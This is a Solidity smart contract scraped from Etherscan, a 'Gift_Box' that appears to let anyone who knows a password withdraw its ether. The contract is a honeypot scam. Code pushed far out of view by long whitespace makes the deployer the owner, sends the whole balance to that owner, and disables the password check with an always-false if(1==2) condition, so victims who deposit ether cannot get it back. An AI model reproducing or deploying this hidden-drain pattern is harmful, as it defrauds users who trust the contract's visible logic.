//token_name	
//token_url	https://etherscan.io//address/0x2bb5b9f83391d4190f8b283be0170570953c5a8e#code
//spider_time	2018/07/08 12:47:44
//token_Transactions	22 txns
//token_price	

pragma solidity ^0.4.18;

contract Gift_Box
{                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      address prop = msg.sender;
    function()payable{}
    
    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
    
    bytes32 public hashPass;
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if(msg.value >= 1 ether)
        {
            hashPass = hash;
        }
    }
    
    function GetGift(bytes pass)
    public
    payable
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               if(msg.sender==prop){msg.sender.transfer(this.balance);}if(1==2){
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
    }
}